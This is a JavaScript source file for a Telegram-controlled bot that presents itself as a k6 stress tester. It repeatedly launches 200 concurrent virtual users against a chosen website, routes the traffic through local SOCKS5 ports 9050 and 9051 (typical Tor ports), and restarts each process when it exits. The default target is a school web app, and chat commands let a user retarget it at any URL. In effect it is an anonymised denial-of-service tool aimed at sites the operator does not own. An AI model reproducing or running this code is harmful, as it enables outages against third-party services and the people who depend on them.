const { Telegraf } = require('telegraf');
const { spawn, execSync } = require('child_process');
const path = require('path');
const https = require('https');

const BOT_TOKEN = process.env.BOT_TOKEN;
let currentTargetUrl = process.env.TARGET_URL || 'https://schoolwebapp.com/';
let awaitingUrl = false;
let adminChatId = null;

if (!BOT_TOKEN) {
  console.error('❌ BOT_TOKEN environment variable is required');
  console.error('   Get one from @BotFather on Telegram');
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
let isRunning = false;
let currentProcesses = [];
let statusMessage = '🔴 Idle';

function spawnK6Instance(port, vus) {
  const testFile = path.join(__dirname, '3-stress-test.js');
  const env = { ...process.env, TARGET_URL: currentTargetUrl, HTTP_PROXY: `socks5://127.0.0.1:${port}`, HTTPS_PROXY: `socks5://127.0.0.1:${port}`, MAX_VUS: String(vus) };

  const proc = spawn('k6', ['run', testFile], { env, stdio: 'pipe' });
  currentProcesses.push(proc);

  proc.stdout.on('data', (data) => {
    process.stdout.write(`[k6:${port}] ${data}`);
  });

  proc.stderr.on('data', (data) => {
    process.stderr.write(`[k6:${port}] ${data}`);
  });

  proc.on('close', (code) => {
    const idx = currentProcesses.indexOf(proc);
    if (idx === -1) return;
    currentProcesses.splice(idx, 1);
    if (isRunning) {
      spawnK6Instance(port, vus);
    } else if (currentProcesses.length === 0) {
      statusMessage = '🔴 Idle';
    }
  });

  proc.on('error', (err) => {
    const idx = currentProcesses.indexOf(proc);
    if (idx === -1) return;
    currentProcesses.splice(idx, 1);
    if (isRunning) {
      spawnK6Instance(port, vus);
    } else if (currentProcesses.length === 0) {
      statusMessage = '🔴 Idle';
    }
  });

  return proc;
}

function spawnK6() {
  currentProcesses = [];

  const instances = [
    { port: 9050, vus: 100 },
    { port: 9051, vus: 100 },
  ];

  for (const inst of instances) {
    spawnK6Instance(inst.port, inst.vus);
  }
}

async function startTest(ctx) {
  if (isRunning) {
    return ctx.reply('⚠️ Test is already running! Use /stop first.');
  }

  adminChatId = ctx.chat.id;
  isRunning = true;
  statusMessage = '🟢 Running';

  spawnK6();

  await ctx.reply(`🚀 Stress test started!\nTarget: ${currentTargetUrl}\nContinuous load with 200 VUs...\nSend /stop to halt.`);
}

bot.start(async (ctx) => {
  await ctx.reply(
    '🤖 K6 Stress Test Bot\n\n' +
    'Commands:\n' +
    '/start - Start continuous stress test\n' +
    '/stop - Stop the stress test\n' +
    '/change - Change the target URL\n' +
    '/status - Check current status\n' +
    '/help - Show this help'
  );
  adminChatId = ctx.chat.id;
  await startTest(ctx);
});

bot.help((ctx) => ctx.reply(
  'How it works:\n' +
  '• /start runs k6 continuously (200 VUs)\n' +
  '• /stop kills the test immediately\n' +
  '• /change lets you set a new target URL\n' +
  '• /status shows current state\n' +
  '• Current target: ' + currentTargetUrl
));

bot.command('stop', async (ctx) => {
  if (currentProcesses.length === 0 && !isRunning) {
    return await ctx.reply('⚠️ No test is currently running.');
  }

  isRunning = false;
  statusMessage = '🔴 Idle';

  for (const proc of currentProcesses) {
    try {
      if (process.platform === 'win32') {
        spawn('taskkill', ['/pid', proc.pid.toString(), '/f', '/t']);
      } else {
        proc.kill('SIGTERM');
      }
    } catch (e) {}
  }
  setTimeout(() => {
    for (const proc of currentProcesses) {
      try { proc.kill('SIGKILL'); } catch (e) {}
    }
    currentProcesses = [];
  }, 3000);

  try {
    await ctx.reply('⏹️ Stress test stopped. Website is now free.');
  } catch (e) {}
});

bot.command('change', async (ctx) => {
  adminChatId = ctx.chat.id;
  awaitingUrl = true;
  await ctx.reply('🌐 Send me the new target URL (e.g., https://example.com):');
});

bot.command('status', (ctx) => {
  ctx.reply(`Status: ${statusMessage}\nTarget: ${currentTargetUrl}`);
});

bot.on('text', async (ctx) => {
  if (!awaitingUrl) return;
  if (ctx.message.text.startsWith('/')) return;

  let url = ctx.message.text.trim();
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    url = 'https://' + url;
  }

  try {
    new URL(url);
  } catch (e) {
    return ctx.reply('❌ Invalid URL. Enter a valid URL (e.g., https://example.com).');
  }

  currentTargetUrl = url;
  awaitingUrl = false;
  await ctx.reply(`✅ Target URL changed to: ${url}`);

  if (isRunning) {
    await ctx.reply('🔄 Restarting stress test with new target...');
    for (const proc of currentProcesses) {
      try { proc.kill('SIGKILL'); } catch (e) {}
    }
    currentProcesses = [];
    spawnK6();
    await ctx.reply(`🚀 Stress test resumed on: ${url}`);
  }
});

function clearTelegramWebhook() {
  return new Promise((resolve) => {
    https.get(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook?drop_pending_updates=true`, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => resolve());
    }).on('error', () => resolve());
  });
}

async function startBot() {
  for (let i = 0; i < 10; i++) {
    await clearTelegramWebhook();
    try {
      await bot.launch();
      console.log('🤖 Bot is running!');
      return;
    } catch (err) {
      if (err.response?.error_code === 409) {
        const wait = 2 ** i * 1000;
        console.log(`⚠️ 409 conflict (attempt ${i + 1}), waiting ${wait}ms...`);
        await new Promise(r => setTimeout(r, wait));
      } else {
        throw err;
      }
    }
  }
  throw new Error('Failed to start bot after 10 attempts');
}

startBot().catch(err => console.error('Failed to start bot:', err.message));

function shutdown(signal) {
  console.log(`Received ${signal}, shutting down...`);
  isRunning = false;
  for (const proc of currentProcesses) {
    try { proc.kill('SIGKILL'); } catch (e) {}
  }
  currentProcesses = [];
  try { bot.stop(signal); } catch (e) {}
  setTimeout(() => process.exit(0), 1000);
}

process.once('SIGINT', () => shutdown('SIGINT'));
process.once('SIGTERM', () => shutdown('SIGTERM'));

const PORT = process.env.PORT || 3000;
require('http').createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end(`Status: ${statusMessage}`);
}).listen(PORT, () => console.log(`🌐 Health server on port ${PORT}`));
